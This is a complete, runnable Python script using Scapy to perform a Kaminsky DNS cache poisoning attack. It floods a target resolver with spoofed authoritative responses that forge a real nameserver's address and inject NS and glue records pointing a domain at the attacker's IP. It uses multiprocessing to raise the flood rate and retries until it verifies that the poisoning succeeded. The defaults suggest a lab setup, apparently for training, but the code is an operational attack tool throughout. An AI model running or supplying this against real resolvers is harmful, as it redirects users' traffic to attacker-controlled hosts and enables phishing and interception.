#!/usr/bin/env python3
import random
import argparse
import multiprocessing
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sr1, conf

# --- Configuration ---
# Disable Scapy's verbose output to improve performance
conf.verb = 0

def spoof_worker(args):
    """
    Worker function for a single process.
    Receives a pre-built DNS payload and sends a specified number of packets.
    """
    resolver_ip, real_ns_ip, dns_payload, num_packets_to_send = args

    for _ in range(num_packets_to_send):
        # The only work done in this hot loop is creating the fast IP/UDP layers
        # and randomizing the necessary fields.
        packet = IP(src=real_ns_ip, dst=resolver_ip) / \
                 UDP(sport=53, dport=random.randint(1024, 65535)) / \
                 dns_payload
        
        # Manually set a random transaction ID on the pre-built payload
        packet[DNS].id = random.randint(1, 65535)
        
        send(packet)

def run_attack(resolver_ip, attacker_ip, real_ns_ip, target_domain, num_requests, num_responses):
    """
    Performs a single attempt of the Kaminsky attack using a multiprocessing pool.
    """
    random_subdomain = str(random.randint(10000, 99999)) + "." + target_domain
    fake_ns_domain = "ns.attacker-lab.com"
    print(f"[*]   Using random subdomain: {random_subdomain}")

    print(f"[*]   Sending {num_requests} initial queries...")
    for _ in range(num_requests):
        query_packet = IP(dst=resolver_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname=random_subdomain))
        send(query_packet)

    # --- Pre-craft the constant part of the DNS response ---
    # This is the key optimization: we do the expensive part only once.
    dns_payload = DNS(
        qr=1, aa=1,
        qd=DNSQR(qname=random_subdomain),
        an=DNSRR(rrname=random_subdomain, ttl=86400, rdata=attacker_ip),
        ns=DNSRR(rrname=target_domain, type='NS', ttl=86400, rdata=fake_ns_domain),
        ar=DNSRR(rrname=fake_ns_domain, ttl=86400, rdata=attacker_ip)
    )

    # --- Multiprocessing Flood ---
    print(f"[*]   Flooding with {num_responses} spoofed responses using multiprocessing...")
    
    # Use all available CPU cores for the attack
    num_processes = multiprocessing.cpu_count()
    packets_per_process = num_responses // num_processes
    
    # Create a list of arguments for each worker process
    tasks = [(resolver_ip, real_ns_ip, dns_payload, packets_per_process) for _ in range(num_processes)]
    
    # Create a pool of worker processes and run the flood
    with multiprocessing.Pool(processes=num_processes) as pool:
        pool.map(spoof_worker, tasks)

def verify_attack(resolver_ip, target_domain, attacker_ip):
    """Checks if the cache poisoning was successful."""
    print("[*]   Verifying attack...")
    try:
        query = IP(dst=resolver_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname=target_domain))
        response = sr1(query, timeout=2)

        if response and response.haslayer(DNSRR) and response[DNSRR].rdata == attacker_ip:
            return True
    except Exception:
        pass
    
    return False

def main():
    parser = argparse.ArgumentParser(description="Kaminsky DNS Cache Poisoning Attack (High-Speed Python)")
    parser.add_argument("--resolver", default="192.168.100.10", help="IP of the target DNS resolver.")
    parser.add_argument("--attacker-ip", default="10.0.2.15", help="IP of the attacker's machine.")
    parser.add_argument("--real-ns", default="8.8.8.8", help="IP of the real nameserver to impersonate.")
    parser.add_argument("--domain", default="my-lab-bank.com", help="The target domain to poison.")
    parser.add_argument("--tries", type=int, default=1000, help="Number of attack attempts to make.")
    parser.add_argument("--requests", type=int, default=100, help="Number of initial DNS queries per try.")
    parser.add_argument("--responses", type=int, default=500, help="Number of spoofed responses per try.")
    args = parser.parse_args()

    print("\n--- DNS Cache Poisoning Attack Starting ---")
    print(f"[+] Target Domain: {args.domain}")
    print(f"[+] Target Resolver: {args.resolver}")
    print(f"[+] Using {multiprocessing.cpu_count()} CPU cores for the attack.")
    print("-------------------------------------------\n")

    for i in range(args.tries):
        print(f"[*] --- Attempt #{i + 1} of {args.tries} ---")
        run_attack(args.resolver, args.attacker_ip, args.real_ns, args.domain, args.requests, args.responses)
        
        if verify_attack(args.resolver, args.domain, args.attacker_ip):
            print("\n[SUCCESS] DNS cache successfully poisoned!")
            print(f"[RESULT]  {args.domain} now points to {args.attacker_ip}")
            return
        else:
            print("[-]   Attack failed on this attempt. Trying again...\n")

    print("\n[FAILURE] All attack attempts failed. The DNS cache was not poisoned.")

if __name__ == "__main__":
    main()
